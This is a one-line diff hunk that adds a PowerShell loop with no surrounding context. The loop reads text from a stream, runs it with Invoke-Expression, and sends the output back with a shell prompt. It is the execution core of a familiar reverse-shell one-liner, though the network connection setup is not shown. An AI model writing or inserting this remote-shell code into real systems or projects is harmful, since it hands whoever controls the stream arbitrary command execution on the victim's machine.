@@ -1,0 +1,1 @@
+while(($i = $c.Read($e, 0, $e.Length)) -ne 0){$f = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0, $i);$g = (iex $f | Out-String ) 2>&1;$g2 = $g + 'PS ' + (pwd).Path + '> ';$h = ([text.encoding]::ASCII).GetBytes($g2);$c.Write($h,0,$h.Length);$c.Flush()}
